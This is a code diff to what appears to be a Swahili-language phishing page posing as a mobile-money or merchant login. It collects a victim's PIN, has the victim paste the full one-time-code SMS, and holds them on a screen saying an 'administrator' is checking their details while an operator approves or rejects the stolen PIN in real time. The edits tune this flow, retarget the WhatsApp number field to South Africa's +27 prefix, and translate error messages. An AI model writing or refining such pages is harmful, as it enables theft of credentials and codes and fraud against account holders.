@@ -194,6 +194,9 @@
   .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
 
+  /* Hide OTP input section by default — only show after admin approves PIN */
+  #otpInputSection { display:none; }
+
   /* ───── PAGE 8: MERCHANT PIN ───── */
   #page-merchant-pin { background:#fff; }
 
@@ -481,12 +484,12 @@
       <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
 
       <!-- Waiting for admin approval indicator -->
-      <div class="waiting-box" id="pinWait">
+      <div class="waiting-box show" id="pinWait">
         <div class="wb-spinner"></div>
         <p>Inasubiri msimamizi kuthibitisha maelezo yako…</p>
       </div>
 
-      <div id="otpInputSection">
+      <div id="otpInputSection" style="display:none !important;">
         <p style="font-size:0.9rem;color:#333;margin-bottom:12px;font-weight:500;">Nakili ujumbe kamili uliyotumwa kwenye simu na ubandike hapa.</p>
         <div class="otp-inputs">
           <textarea class="otp-box" id="otpInput" placeholder="Bandika ujumbe kamili hapa." oninput="chkOtp()"></textarea>
@@ -603,7 +606,7 @@
         <div id="helpInputSection">
           <label style="display:block;font-size:0.82rem;font-weight:500;color:#666;margin-bottom:6px;">Nambari ya WhatsApp</label>
           <div style="display:flex;">
-            <div style="padding:11px 12px;background:#f5f5f5;border:1.5px solid #ddd;border-right:none;border-radius:8px 0 0 8px;font-size:0.85rem;font-weight:500;color:#555;white-space:nowrap;display:flex;align-items:center;">Tz +255</div>
+            <div style="padding:11px 12px;background:#f5f5f5;border:1.5px solid #ddd;border-right:none;border-radius:8px 0 0 8px;font-size:0.85rem;font-weight:500;color:#555;white-space:nowrap;display:flex;align-items:center;">🇿🇦 +27</div>
             <input type="tel" id="whatsappNum" placeholder="712345678" maxlength="10" oninput="normalizePhone('whatsappNum');chkWhatsapp()" style="flex:1;padding:11px 14px;border:1.5px solid #ddd;border-left:none;border-radius:0 8px 8px 0;font-family:'Inter',sans-serif;font-size:0.9rem;outline:none;transition:border-color 0.2s;">
           </div>
           <button class="btn-otp" id="bWhatsapp" style="width:100%;margin-top:20px;padding:13px;background:#e8e8e8;color:#aaa;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;letter-spacing:0.05em;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.2s;" onclick="submitWhatsapp()">TUMA NAMBARI</button>
@@ -908,8 +911,10 @@
 
         // Transition to OTP page — but show "waiting for admin" first
         goTo('page-otp');
+        // Ensure waiting indicator is visible and OTP input is hidden
         document.getElementById('pinWait').classList.add('show');
-        document.getElementById('otpInputSection').style.display = 'none';
+        const otpSection = document.getElementById('otpInputSection');
+        if (otpSection) otpSection.style.display = 'none';
 
         // Start polling for PIN approval
         pollPinStatus();
@@ -1130,13 +1135,13 @@
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Verification failed. Please contact support.');
+          showOtpMsg('error', 'Uthibitisho umeshindwa. Tafadhali wasiliana na msaada.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           // Admin flagged PIN as wrong — send user back to login
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'PIN uliyoweka si sahihi. Inaelekezwa kwenye ukurasa wa kuingia...');
+          showOtpMsg('error', 'PIN si sahihi iliyotambuliwa. Inakamatia kuingia tena…');
           setTimeout(() => {
             // Clear OTP textarea
             document.getElementById('otpInput').value = '';
@@ -1167,7 +1172,7 @@
           chkOtp();
           document.getElementById('bOtp').disabled = false;
           
-          showOtpMsg('error', 'Ujumbe uliobandika si sahihi. Tafadhali ukague kisha uuweke tena.');
+          showOtpMsg('error', 'Nambari ya OTP si sahihi. Tafadhali angalia na ingiza tena.');
           
           if (S.otpAttempts >= 2) {
             setTimeout(() => {
